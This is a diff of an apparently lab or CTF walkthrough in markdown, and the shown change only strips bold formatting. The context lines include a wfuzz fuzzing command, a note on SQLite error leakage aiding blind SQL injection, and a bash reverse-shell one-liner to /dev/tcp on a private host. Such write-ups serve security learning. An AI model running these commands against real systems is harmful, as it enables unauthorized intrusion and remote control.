@@ -25,7 +25,7 @@ wfuzz -c -w /opt/SecLists/Fuzzing/special-chars.txt -d 'password=FUZZ' http://19
 
 
 <img width="2047" height="1237" alt="Captura de pantalla 2026-02-14 193055" src="https://github.com/user-attachments/assets/fe670f77-738f-48ba-ba9e-32cb001b3183" />
-The error reveals the backend is using **SQLite**. It also exposes the query structure, showing a table named `code` and a column named `password`.
+The error reveals the backend is using SQLite. It also exposes the query structure, showing a table named `code` and a column named `password`.
 
 
 - I developed a script to automate a character-by-character injection to extract the password.
@@ -69,7 +69,7 @@ for i in tqdm(range(1,100)):
 
 
 <img width="1425" height="770" alt="Captura de pantalla 2026-02-15 034131" src="https://github.com/user-attachments/assets/bd2fbd4c-6980-489f-acad-8450b694fd49" />
-It responds. Now, let's aim for a **reverse shell**.
+It responds. Now, let's aim for a reverse shell.
 
 ```
 bash; bash -i >& /dev/tcp/192.168.1.197:4444 0>&1
